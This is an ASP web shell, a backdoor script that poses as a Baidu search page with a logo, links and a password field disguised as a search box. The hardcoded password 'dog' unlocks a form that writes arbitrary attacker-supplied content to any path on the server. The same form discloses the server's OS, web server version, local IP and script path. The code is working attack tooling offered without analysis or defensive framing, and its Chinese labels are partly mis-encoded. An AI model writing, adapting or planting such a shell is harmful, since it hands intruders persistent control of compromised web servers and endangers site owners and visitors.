<%
on error resume next
%>
<%
  if request("pass")="dog" then
  session("pw")="go"
  end if
%>
<%if session("pw")<>"go" then %>
<%="<center><br><form action='' method='post'>"%>
<%="<center><img src=http://www.baidu.com/img/baidu_logo.gif width=270 height=129>"%>
<%="<br>"%>
<%="<font color='#0000FF'><a href=http://www.hake.cc>�� ��</a>  <a href=http://www.hake.cc>�� ҳ</a>  <a href=http://www.hake.cc>�� ��</a>  <a href=http://www.hake.cc>֪ ��</a>  <a href=http://www.hake.cc>MP3</a>  <a href=http://www.hake.cc>ͼ Ƭ</a>  <a href=http://www.hake.cc>�� Ƶ</a></font>"%>
<%="<br><br>"%>
<%="<input name='pass' type='password' size='33'> <input "%><%="type='submit' value='�ٶ�һ��'></center>"%>
<%="<br><br><br>"%>
<%="<span style='border-bottom:#0000FF solid 1px;'><font color='#0000FF'><a href=http://www.hake.cc>���Ͳ���|�н�ר��</a></font></span>"%>
<%="<br><br><br>"%>
<%="<span style='border-bottom:#0000FF solid 1px;'><font size=2 color='#0000FF'><a href=http://www.baidu.cn>�Ѱٶ���Ϊ��ҳ</a></font></span>"%>
<%else%>
<%
set fso=server.createobject("scripting.filesystemobject")
path=request("path")
if path<>"" then
data=request("da")
set da=fso.createtextfile(path,true)
da.write data
if err=0 then
%>
<%="yes"%>
<%else%>
<%="no"%>
<%
end if
err.clear
end if
da.close
%>
<%set da=nothing%>
<%set fos=nothing%>
<%="<form action='' method=post>"%>
<%="<input type=text name=path>"%>
<%="<br>"%>
<%="��ǰ�ļ�·��:"&server.mappath(request.servervariables("script_name"))%>
<%="<br>"%>
<%="����ϵͳΪ:"&Request.ServerVariables("OS")%>
<%="<br>"%>
<%="WEB�������汾Ϊ:"&Request.ServerVariables("SERVER_SOFTWARE")%>
<%="<br>"%>
<%="��������IPΪ:"&Request.ServerVariables("LOCAL_ADDR")%>
<%="<br>"%>
<%="<textarea name=da cols=50 rows=10 width=30></textarea>"%>
<%="<br>"%>
<%="<input type=submit value=save>"%>
<%="</form>"%>
<%end if%>
